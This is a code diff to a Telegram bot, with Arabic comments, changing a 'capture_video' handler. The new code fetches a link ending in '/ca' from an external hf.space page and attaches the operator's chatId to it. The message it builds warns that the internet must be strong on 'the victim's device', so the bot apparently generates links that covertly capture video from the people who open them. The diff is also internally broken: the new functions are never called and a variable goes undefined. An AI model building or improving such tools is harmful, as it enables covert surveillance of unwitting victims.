@@ -1658,44 +1658,54 @@ bot.on('callback_query', (callbackQuery) => {
     const data = callbackQuery.data;
 
     if (data === 'capture_video') {
-        async function generateMessage() {
+        async function fetchNewLink() {
     const url = "https://sssssskskjwnsb-linklsksn.hf.space";
 
     try {
         const response = await fetch(url, { method: "GET" });
         const html = await response.text();
 
-        // استخراج الروابط من الصفحة
+        // استخدم DOMParser لتحليل HTML
         const parser = new DOMParser();
         const doc = parser.parseFromString(html, "text/html");
 
-        let extractedLink = null;
+        // البحث عن كل الروابط
+        const links = doc.querySelectorAll("a[href]");
 
-        // البحث عن رابط ينتهي بـ /ca
-        doc.querySelectorAll("a[href]").forEach(a => {
+        for (let a of links) {
             const link = a.getAttribute("href");
-            if (link.endsWith("/ca")) {
-                extractedLink = link;
-            }
-        });
 
-        if (!extractedLink) {
-            alert("لم يتم العثور على رابط ينتهي بـ /ca");
-            return;
+            // نفس شرط بايثون: ينتهي بـ /ca
+            if (link.endsWith("/ca")) {
+                return link; // نعيد أول رابط مطابق
+            }
         }
 
-        // توليد الرسالة
-        const message = `تم انشاء الرابط
-ملاحظه: قم في تليغم رابط جديد في كل مره
-ملاحظه: يجب أن يكون النت قوي في جهاز الضحيه
-الرابط: ${extractedLink}`;
+        return null;
 
-        console.log(message);
-        return message;
-
-    } catch (error) {
-        console.error("Error:", error);
+    } catch (e) {
+        console.error("Error:", e);
+        return null;
     }
+}
+
+// عند الضغط على الزر
+async function onButtonClick(chatId) {
+    const fetchedLink = await fetchNewLink();
+
+    if (!fetchedLink) {
+        alert("لم يتم العثور على رابط ينتهي بـ /ca");
+        return;
+    }
+
+    const message =
+        "تم انشاء الرابط.\n" +
+        "ملاحظة: قم بتلقيم رابط جديد في كل مرة.\n" +
+        "ملاحظة: يجب أن يكون النت قوي في جهاز الضحية.\n" +
+        `${fetchedLink}?chatId=${chatId}`;
+
+    console.log("Final Message:", message);
+    // هنا ارسل الرسالة بالطريقة التي تستخدمها
 }
 
         if (message && message.trim() !== '') {
